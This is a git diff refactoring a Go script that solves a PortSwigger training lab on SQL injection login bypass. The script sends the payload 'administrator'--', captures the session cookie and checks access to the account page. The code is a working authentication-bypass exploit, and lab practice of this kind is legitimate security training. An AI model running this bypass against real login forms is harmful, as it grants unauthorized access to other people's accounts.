@@ -3,6 +3,7 @@ package main
 // lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass
 
 import (
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -13,7 +14,7 @@ import (
 )
 
 const (
-	uri = "/login"
+	uriLogin      = "/login"
 	uriGetAccount = "/my-account?id="
 	defaultUsername = "administrator"
 	defaultPayload = "'--"
@@ -22,136 +23,131 @@ const (
 	sessionCookieName = "session"
 )
 
-func main() {
-	labURL, csrfToken, username, password, proxyURL := parseArgs()
-
-	targetURL := prepareURL(labURL)
-	client := prepareClient(proxyURL)
-
-	sessionCookie := exploitSQLi(*client, targetURL, csrfToken, username, password)
-
-	if sessionCookie == nil {
-		fmt.Println("[-] Falid to send the payload and retrieve cookie")
-		os.Exit(4)
-	}
-
-	exploited := assertThatUserIsLogedIn(*client, targetURL, username, sessionCookie)
-
-	if exploited {
-		fmt.Println("[+] SQL injection successful!")
-	} else {
-		fmt.Println("[-] SQL injection unsuccessful!")
-	}
+type config struct {
+	labURL    string
+	csrfToken string
+	username  string
+	password  string
+	proxyURL  string
 }
 
-func parseArgs() (string, string, string, string, string) {
-	labURL := flag.String("u", "", "Root URL of the PortSwigger Lab")
-	csrfToken := flag.String("csrf", "", "CSRF Token")
-	username := flag.String("username", "", "Username (Optional)")
-	password := flag.String("password", "", "Password (Optional)")
-	proxyURL := flag.String("proxy", "", "Proxy URL if wanted (Optional)")
+func main() {
+	cfg := parseArgs()
 
-	flag.Parse()
+	targetURL := normalizeURL(cfg.labURL)
+	client := newClient(cfg.proxyURL)
 
-	if *labURL == "" || *csrfToken == ""{
-		fmt.Println("The lab URL and CSRF Token must be provided")
-		fmt.Printf("[-] Usage: -u <uri> --username <username> --password <password> <payload> --proxy <porxyURL>\n")
+	fmt.Println("[+] Starting SQL injection test")
+
+	sessionCookie, err := executeLoginAttack(client, targetURL, cfg)
+	if err != nil {
+		fmt.Printf("[-] Attack failed: %v\n", err)
 		os.Exit(1)
 	}
 
-	return *labURL, *csrfToken, *username, *password, *proxyURL
+	success, err := verifyLogin(client, targetURL, cfg.username, sessionCookie)
+	if err != nil {
+		fmt.Printf("[-] Verification failed: %v\n", err)
+		os.Exit(1)
+	}
+
+	if success {
+		fmt.Println("[+] SQL injection successful!")
+	} else {
+		fmt.Println("[-] SQL injection unsuccessful")
+	}
 }
 
-func prepareURL(labURL string) string {
+func parseArgs() config {
+	var cfg config
+
+	flag.StringVar(&cfg.labURL, "u", "", "Root URL of the PortSwigger Lab")
+	flag.StringVar(&cfg.csrfToken, "csrf", "", "CSRF Token")
+	flag.StringVar(&cfg.username, "username", defaultUsername, "Username (Optional)")
+	flag.StringVar(&cfg.password, "password", defaultPassowrd, "Password (Optional)")
+	flag.StringVar(&cfg.proxyURL, "proxy", "", "Proxy URL if wanted (Optional)")
+
+	flag.Parse()
+
+	if cfg.labURL == "" || cfg.csrfToken == "" {
+		fmt.Println("[-] The lab URL and CSRF Token must be provided")
+		fmt.Println("[-] Usage: -u <uri> --csrf <token> [--username <username>] [--password <password>] [--proxy <proxyURL>]")
+		os.Exit(1)
+	}
+
+	return cfg
+}
+
+func normalizeURL(labURL string) string {
 	// Ensure URL has proper protocol prefix
 	if !strings.HasPrefix(labURL, "http://") && !strings.HasPrefix(labURL, "https://") {
 		labURL = "http://" + labURL
 	}
 
-	if strings.HasSuffix(labURL, "/") {
-		labURL = labURL[:len(labURL) - 1]
-	}
-
-	return labURL
+	// Remove trailing slash if present
+	return strings.TrimSuffix(labURL, "/")
 }
 
-func configureProxy(proxyURL string) *http.Transport{
+func newClient(proxyURL string) *http.Client {
 	transport := &http.Transport{}
+
 	if proxyURL != "" {
-		urlWithProxy, err := url.Parse(proxyURL)
+		proxyURLParsed, err := url.Parse(proxyURL)
 		if err != nil {
-			fmt.Println("[-] Error parsing proxy URL:", err)
-			os.Exit(2)
+			fmt.Printf("[-] Error parsing proxy URL: %v\n", err)
+			os.Exit(1)
 		}
-
-		transport.Proxy = http.ProxyURL(urlWithProxy)
+		transport.Proxy = http.ProxyURL(proxyURLParsed)
 	}
 
-	return transport
+	return &http.Client{Transport: transport}
 }
 
-func prepareClient(proxyURL string) *http.Client {
-	return &http.Client{Transport: configureProxy(proxyURL)}
-}
+func executeLoginAttack(client *http.Client, targetURL string, cfg config) (*http.Cookie, error) {
+	fullURL := targetURL + uriLogin
 
-func exploitSQLi(client http.Client, targetURL, csrfToken, username, password string) *http.Cookie {
-	fullURL := targetURL + uri
-	if username == "" {
+	username := cfg.username
+	if username == defaultUsername {
 		username = defaultUsername + defaultPayload
-	}
-	if password == "" {
-		password = defaultPassowrd
 	}
 
 	fmt.Printf("[+] Sendding request to URL \"%s\"\n", fullURL)
-	fmt.Printf("[+] with Username: \"%s\" and Password: \"%s\"\n", username, password)
+	fmt.Printf("[+] with Username: \"%s\" and Password: \"%s\"\n", username, cfg.password)
 
-	requestBody := fmt.Sprintf("csrf=%s&username=%s&password=%s", csrfToken, username, password)
+	requestBody := fmt.Sprintf("csrf=%s&username=%s&password=%s", cfg.csrfToken, username, cfg.password)
 
 	// Create the POST request
-	req, err := http.NewRequest("POST", fullURL, strings.NewReader(requestBody))
+	req, err := http.NewRequest(http.MethodPost, fullURL, strings.NewReader(requestBody))
 	if err != nil {
-		fmt.Println("[-] Error creating request:", err)
-		return nil
+	return nil, fmt.Errorf("error creating request: %w", err)
 	}
 	// Set Content-Type header (if needed, e.g., for form data)
 	req.Header.Set("Content-Type", contentType)
 
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("[-] Error during HTTP request:", err)
-		return nil
+	return nil, fmt.Errorf("error during HTTP request: %w", err)
 	}
 
-	defer func(Body io.ReadCloser) {
-		err := Body.Close()
-		if err != nil {
-			fmt.Println("[-] Error while closing response body")
-		}
-	}(resp.Body)
+	defer safeClose(resp.Body)
 
-	// Get all cookies form the response
-	cookies := resp.Cookies()
-
-	var sessionCookie *http.Cookie
-	for _, cookie := range cookies {
+	// Find session cookie
+	for _, cookie := range resp.Cookies() {
 		if cookie.Name == sessionCookieName {
-			sessionCookie = cookie
-			break
+			return cookie, nil
 		}
 	}
 
-	return sessionCookie
+	return nil, errors.New("session cookie not found in response")
 }
 
-func assertThatUserIsLogedIn(client http.Client, targetURL, username string, cookie *http.Cookie) bool {
+func verifyLogin(client *http.Client, targetURL, username string, cookie *http.Cookie) (bool, error) {
 	fullURL := targetURL + uriGetAccount + username
 
 	// Create a new HTTP GET request
-	req, err := http.NewRequest("GET", fullURL, nil)
+	req, err := http.NewRequest(http.MethodGet, fullURL, nil)
 	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return false
+		return false, fmt.Errorf("error creating verification request: %w", err)
 	}
 
 	// Add the cookie to the request
@@ -160,22 +156,23 @@ func assertThatUserIsLogedIn(client http.Client, targetURL, username string, coo
 	// Send the request
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("Error sending request:", err)
-		return false
+		return false, fmt.Errorf("error sending verification request: %w", err)
 	}
-	defer func(Body io.ReadCloser) {
-		err := Body.Close()
-		if err != nil {
-			fmt.Println("[-] Error while closing response body")
-		}
-	}(resp.Body)
+	defer safeClose(resp.Body)
 
-	// Assert on the status code
+	// Check if verification was successful
 	if resp.StatusCode == http.StatusOK {
 		fmt.Printf("[+] Status code is as expected: %d\n", resp.StatusCode)
-		return true
-	} else {
-		fmt.Printf("[-] Unexpected status code: got %d, expected %d\n", resp.StatusCode, http.StatusOK)
-		return false
+		return true, nil
+	}
+
+	fmt.Printf("[-] Unexpected status code: got %d, expected %d\n", resp.StatusCode, http.StatusOK)
+	return false, nil
+
+}
+
+func safeClose(closer io.Closer) {
+	if err := closer.Close(); err != nil {
+		fmt.Printf("[-] Error closing resource: %v\n", err)
 	}
 }
